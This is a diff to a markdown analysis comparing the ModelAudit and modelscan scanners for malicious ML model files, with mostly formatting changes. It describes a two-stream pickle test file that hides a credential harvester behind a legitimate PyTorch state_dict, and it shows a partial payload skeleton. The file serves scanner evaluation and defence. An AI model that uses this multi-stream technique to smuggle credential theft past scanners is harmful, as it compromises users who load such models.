@@ -32,19 +32,19 @@ This analysis identifies critical gaps in ProtectAI's modelscan detection capabi
 
 ## Technical Comparison Matrix
 
-| Detection Category               | ModelAudit  | modelscan | Risk Level   |
-| -------------------------------- | ----------- | --------- | ------------ |
-| **Pickle/PyTorch (Single)**     | ✅ Advanced | ✅ Basic  | LOW          |
-| **Multiple Pickle Streams**      | ✅          | ❌        | **CRITICAL** |
-| **GGUF Template Injection**      | ✅          | ❌        | **CRITICAL** |
-| **ONNX Scanning**                | ✅          | ❌        | **HIGH**     |
-| **Config Exploits**              | ✅          | ❌        | **HIGH**     |
-| **Jinja2 Templates**             | ✅          | ❌        | **HIGH**     |
-| **Steganographic Attacks**       | ✅          | ❌        | **HIGH**     |
-| **Weight Distribution**          | ✅          | ❌        | **MEDIUM**   |
-| **Network Communication**        | ✅          | ❌        | **MEDIUM**   |
-| **JIT Script Detection**         | ✅          | ❌        | **MEDIUM**   |
-| **Manifest Analysis**            | ✅          | ❌        | **MEDIUM**   |
+| Detection Category          | ModelAudit  | modelscan | Risk Level   |
+| --------------------------- | ----------- | --------- | ------------ |
+| **Pickle/PyTorch (Single)** | ✅ Advanced | ✅ Basic  | LOW          |
+| **Multiple Pickle Streams** | ✅          | ❌        | **CRITICAL** |
+| **GGUF Template Injection** | ✅          | ❌        | **CRITICAL** |
+| **ONNX Scanning**           | ✅          | ❌        | **HIGH**     |
+| **Config Exploits**         | ✅          | ❌        | **HIGH**     |
+| **Jinja2 Templates**        | ✅          | ❌        | **HIGH**     |
+| **Steganographic Attacks**  | ✅          | ❌        | **HIGH**     |
+| **Weight Distribution**     | ✅          | ❌        | **MEDIUM**   |
+| **Network Communication**   | ✅          | ❌        | **MEDIUM**   |
+| **JIT Script Detection**    | ✅          | ❌        | **MEDIUM**   |
+| **Manifest Analysis**       | ✅          | ❌        | **MEDIUM**   |
 
 ## Critical Blind Spots Demonstrated
 
@@ -115,6 +115,7 @@ modelscan -p .
 **Generated Test Assets**: Located in `tests/assets/pickles/`
 
 #### Steganographic Attack Model
+
 ```bash
 # File: tests/assets/pickles/steganographic_attack.pkl (2,898 bytes)
 # Contains: 2 pickle streams (legitimate + malicious)
@@ -122,10 +123,10 @@ modelscan -p .
 # ModelAudit Results:
 modelaudit tests/assets/pickles/steganographic_attack.pkl
 ✅ CRITICAL: Multiple pickle streams detected: 2 streams found
-✅ Stream analysis: Both streams independently analyzed 
+✅ Stream analysis: Both streams independently analyzed
 ⏱️  Scan time: 0.04s
 
-# ModelScan Results:  
+# ModelScan Results:
 modelscan -p tests/assets/pickles/steganographic_attack.pkl
 ❌ "No issues found! 🎉"
 ❌ Only analyzed first stream (missed malicious payload entirely)
@@ -133,6 +134,7 @@ modelscan -p tests/assets/pickles/steganographic_attack.pkl
 ```
 
 #### Simple Eval Attack Model
+
 ```bash
 # File: tests/assets/pickles/simple_eval_attack.pkl
 # Contains: Traditional eval()-based attack
@@ -653,6 +655,7 @@ CRITICAL_MODULES = {
 #### Real-World Test Results
 
 **Test Case**: Steganographic attack with 2 streams (steganographic_attack.pkl):
+
 - **Stream 1**: Legitimate PyTorch state_dict (537 bytes)
 - **Stream 2**: Hidden credential harvester (2,361 bytes)
 
@@ -682,7 +685,7 @@ legitimate_model = collections.OrderedDict([
     # ... legitimate-looking PyTorch metadata
 ])
 
-# Stream 2: Hidden malicious payload  
+# Stream 2: Hidden malicious payload
 malicious_payload = {
     'config_loader': '''
 import os, urllib.request, json, subprocess
@@ -694,6 +697,7 @@ harvest(); persist()
 ```
 
 **Attack Impact**: A sophisticated attacker could:
+
 1. Create a model that appears legitimate in ModelScan analysis
 2. Hide credential theft, persistence, and data exfiltration in subsequent streams
 3. **Completely bypass ModelScan detection**
@@ -702,9 +706,10 @@ harvest(); persist()
 
 **ModelScan Actual Capability**: Despite having code that suggests multiple pickle support, **in practice only processes the first pickle stream**.
 
-**ModelAudit's Superior Implementation**: 
+**ModelAudit's Superior Implementation**:
+
 - **Detects** multiple pickle streams automatically
-- **Analyzes each stream** with fickling independently  
+- **Analyzes each stream** with fickling independently
 - **Reports stream-specific issues** with stream numbers
 - **Warns users** about the inherent risk of multiple streams
 
